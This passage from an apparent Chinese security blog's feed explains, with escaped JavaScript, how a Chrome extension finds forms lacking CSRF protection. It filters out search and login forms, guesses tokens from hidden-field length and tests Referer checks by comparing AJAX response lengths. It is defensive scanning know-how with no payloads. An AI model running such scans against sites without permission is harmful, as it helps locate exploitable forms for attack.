class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chrome.runtime.onMessage.addListener&lt;/code&gt;是接受函数，然后就是AJAX了，在done函数里，有一个API是&lt;code&gt;sendResponse({status: data.length})&lt;/code&gt;返回插件发送AJAX时的长度。这个时候前端base.js将会受到background.js文件的返回结果。代码就返回上面的处理方式了：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.abs(firstAjax - response.status) &amp;lt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    formCache.attr(&lt;span class=&quot;string&quot;&gt;&quot;style&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;border: 1px red solid;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里的Math.abs是求绝对值的，当两次ajax返回的长度差值小于10的时候，说明不存在“Referer检测”，当大于10时，就说明存在“检测Referer的机制”了。这里的10就是&lt;code&gt;容错值&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当存在CSRF漏洞的时候，会在form表单的外部包含一个红色的框，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x05：结尾&quot;&gt;&lt;a href=&quot;#0x05：结尾&quot; class=&quot;headerlink&quot; title=&quot;0x05：结尾&quot;&gt;&lt;/a&gt;0x05：结尾&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;这里的token验证机制还是不完整，我会在下一版中解决的。以及JSON Hijacking。&lt;br&gt;有可能存在第四章。&lt;/p&gt;
&lt;p&gt;文章非常感谢：北风(2660668090)提供的思路及技术支持。&lt;/p&gt;
&lt;p&gt;插件下载地址：&lt;a href=&quot;http://pan.baidu.com/s/1geMUl7l&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1geMUl7l&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class=&quot;headerlink&quot; title=&quot;作者信息：&quot;&gt;&lt;/a&gt;&lt;code&gt;作者信息：&lt;/code&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Author:Black-Hole&lt;/p&gt;
&lt;p&gt;Blog:&lt;a href=&quot;http://bugs.cc/&quot;&gt;http://bugs.cc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/BlackHole1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/BlackHole1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Twitter:&lt;a href=&quot;https://twitter.com/Free_BlackHole&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitter.com/Free_BlackHole&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Email:158blackhole@gmail.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;上一篇只是大致说明整个思路和流程。本篇就详细说说如何检测CSRF。为什么不在上一篇中放出插件呢。是因为误报率确实是比较多，而且无法检测Referer。而本章，重点就说明“如何检测对方是否开启了Referer检测机制”。在我的认知范围内，这是首款检测Referer的工具(不知廉耻的笑了)。今天发现腾讯在2013年就做了类似的&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/24&quot;&gt;产品&lt;/a&gt; (这就尴尬了..)，不过还好。而且思路和实现方法有所区别。本章说检测Referer，第三章说检测token机制的强化,让检测token的成功率达到80~90%以上(其实就是写第二篇的时候，忘记写了。推到第三章了….)。而且这些是腾讯产品所没有的撒。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>自动化检测CSRF</title>
    <link href="http://bugs.cc/2016/06/15/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BCSRF/"/>
    <id>http://bugs.cc/2016/06/15/自动化检测CSRF/</id>
    <published>2016-06-15T12:49:37.000Z</published>
    <updated>2016-08-23T16:01:10.801Z</updated>
    
    <content type="html">&lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;之前写过自动化检测XSS插件，今天来一发自动化检测CSRF的插件。CSRF有多种情况的出现方式，而本章所说的内容没有办法做的那么全面，就比如JSON Hijacking（第二章或者第三章会写），本章我们就说说form表单导致的CSRF漏洞。&lt;br&gt;检测form表单类型的CSRF漏洞和检测form表单类型的XSS漏洞最大的不同就是：XSS需要提交才能检测到，而CSRF只需要分析form表单就行了。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x01-前期的准备工作：&quot;&gt;&lt;a href=&quot;#0x01-前期的准备工作：&quot; class=&quot;headerlink&quot; title=&quot;0x01 前期的准备工作：&quot;&gt;&lt;/a&gt;0x01 前期的准备工作：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;既然要写，那么我们就需要demo来帮我们模拟真实环境的下的情况，而0x00节就说明了，本章只针对于form表单，所以我们的demo也就是各式各样的表单。如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF/img/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;基本上来说网上常见的表单类别都包含了，当然如果你发现有些表单没有加入进去，请说明一下，我将会在下一版中修改。&lt;/p&gt;
&lt;p&gt;我们先遍历整个网页上的form表单。代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;outerFor:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;i &amp;lt; $(&lt;span class=&quot;string&quot;&gt;&quot;form&quot;&lt;/span&gt;).length;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; formDom = $(&lt;span class=&quot;string&quot;&gt;&quot;form&quot;&lt;/span&gt;).eq(i); &lt;span class=&quot;comment&quot;&gt;//formDom代表本次循环的form表单元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imageFileSuffix = [&lt;span class=&quot;string&quot;&gt;&#39;.jpg&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.png&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.jpge&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.ico&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.gif&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.bmp&#39;&lt;/span&gt;]; &lt;span class=&quot;comment&quot;&gt;//图片后缀白名单，用户验证图片是否为验证码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; placeholderFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;跳&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;搜&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;查&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;找&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;登陆&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;注册&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;];  &lt;span class=&quot;comment&quot;&gt;//无用表单黑名单，用于验证这个form表单有没有用（针对input验证）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;find&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;login&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;reg&#39;&lt;/span&gt;];   &lt;span class=&quot;comment&quot;&gt;//无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;至于为什么要加上&lt;code&gt;outerFor:&lt;/code&gt;，是因为这只是最外层的for循环，里面还有for循环，为了方便我们在最里层的for循环里跳出最外层的本次循环。在最里层的for循环里我会使用&lt;code&gt;continue outerFor;&lt;/code&gt;来跳出最外层for的本次循环。（如果没有看懂，请返回上一行重新看，这很重要）&lt;/p&gt;
&lt;h4 id=&quot;0x02-去除类似搜索、页面跳转等无用的form表单：&quot;&gt;&lt;a href=&quot;#0x02-去除类似搜索、页面跳转等无用的form表单：&quot; class=&quot;headerlink&quot; title=&quot;0x02 去除类似搜索、页面跳转等无用的form表单：&quot;&gt;&lt;/a&gt;0x02 去除类似搜索、页面跳转等无用的form表单：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;首先我们需要假象一下有没有特殊的form表单，比如没有action属性，把请求交给JavaScript来完成。而这种特殊的form表单也很常见，所以这里我就先使用if判断action是否存在：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;) != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//当action不为空的时候，进行下一步的操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后就是使用JavaScript的some函数来对action进行判断，当action里的值满足于我们之前设置的黑名单里的字符串时，就直接pass，使用&lt;code&gt;continue&lt;/code&gt;来跳出初始化表达式变量为i的本次循环。转化成代码就是下面这样：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;) != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionCheck = actionFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(actionCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果对some函数不明白的，请移步：&lt;a href=&quot;https://msdn.microsoft.com/zh-cn/library/ff679978(v=vs.94&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://msdn.microsoft.com/zh-cn/library/ff679978(v=vs.94).aspx&lt;/a&gt;.aspx)&lt;br&gt;而在JavaScript里是严格区分大小写的，所以在上面的代码中我使用了toLowerCase()函数，来把action里的值全部转化成小写，然后在其中搜索之前设置的action黑名单，看是否存在。而对比过程如下:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;action的值–search（如果此次比对为true，则不会向下进行比对）&lt;/p&gt;
&lt;p&gt;action的值–find&lt;/p&gt;
&lt;p&gt;……&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其返回的结果是布尔型。在《JavaScript高级程序设计》里是这样说明some函数的:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;对数组中的每一项运行给定函数，如果该函数对任意一项返回true，则返回true。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个时候我们可以看到some前面有一个变量。因为some返回的是布尔型，那么actionCheck变量也是一个布尔型，假设当前这个form表单里的action的值为”/searchArticle.php”。那么就会匹配到黑名单里的search字符串，那么some就会停止向下循环，直接返回true。&lt;br&gt;如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF/img/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后使用if判断&lt;code&gt;actionCheck&lt;/code&gt;变量。如果为true，那么就使用&lt;code&gt;continue&lt;/code&gt;来跳出当前的循环，不向下运行，直接开始下一个循环。&lt;/p&gt;
&lt;p&gt;OK,上面的已经完成对form的action属性过滤了，那么下面的将对input进过白名单过滤。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; x = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;x &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).length;x++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; inputTextCheck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; inputText =  formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).eq(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    inputTextCheck = placeholderFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputTextCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先使用&lt;code&gt;(&amp;quot;:text&amp;quot;)&lt;/code&gt;来遍历当前form表单下所有type为text的input标签。&lt;/p&gt;
&lt;p&gt;inputTextCheck变量是为了存放some函数的布尔结果。而inputText变量代表了当前的input标签。&lt;/p&gt;
&lt;p&gt;然后使用if判断当前input里的placeholder属性是否存在，如果不存在，则跳出初始化表达式变量为x的本次循环。不向下运行，且对下一个input标签进行之前的操作。如果存在且有值的话，if里的表达式会返回false。则这个if判断不会运行，而是向下运行，而代码：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;inputTextCheck = placeholderFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputTextCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;和之前判断action的情况的是一样的，这里就不在阐述了。&lt;/p&gt;
&lt;h4 id=&quot;0x03-去除没有提交按钮的form表单：&quot;&gt;&lt;a href=&quot;#0x03-去除没有提交按钮的form表单：&quot; class=&quot;headerlink&quot; title=&quot;0x03 去除没有提交按钮的form表单：&quot;&gt;&lt;/a&gt;0x03 去除没有提交按钮的form表单：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;为什么要写这个，因为有些form表单不是给用户使用的，他没有提交按钮。对用户来说也是不可见状态。而且也不涉及较为核心的操作，那么我们就需要把这个表单剔除掉。代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:submit&quot;&lt;/span&gt;).length &amp;lt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这段代码较为简单，这里也不在阐述了。&lt;/p&gt;
&lt;h4 id=&quot;0x04-去除具有token的form表单：&quot;&gt;&lt;a href=&quot;#0x04-去除具有token的form表单：&quot; class=&quot;headerlink&quot; title=&quot;0x04 去除具有token的form表单：&quot;&gt;&lt;/a&gt;0x04 去除具有token的form表单：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;大家都知道对于CSRF来说，具有token的form表单基本是可以断定是不存在CSRF漏洞的了，当然排除同页面存在XSS漏洞和CSRF漏洞。&lt;/p&gt;
&lt;p&gt;而token，我们应该怎么样发现呢？type为hidden？name包含token？，不不不。这些都不准确，没办法减少误报和扩大结果。那我们应该怎么做呢？&lt;b&gt;判断type为hidden的input标签里的value值的长度是否大于10&lt;/b&gt;。&lt;/p&gt;
&lt;p&gt;具有token功能的input标签的特殊性：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;type为hidden&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;为了安全起见，token一般是不会小于10位数的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;总是以input标签为媒介的方式传输给后端服务器中。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;OK,那么我们可以遍历当前form表单下所有type为hidden的input标签，再判断value值是否大于10。如果大于10，说明这个表单很大程度上是具有token验证的表单，将会被程序丢弃。跳出初始化表达式变量为i的本次循环。把上面的话转化成代码就是下面这样：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:hidden&quot;&lt;/span&gt;).length;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:hidden&quot;&lt;/span&gt;).eq(j).val().length &amp;gt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span 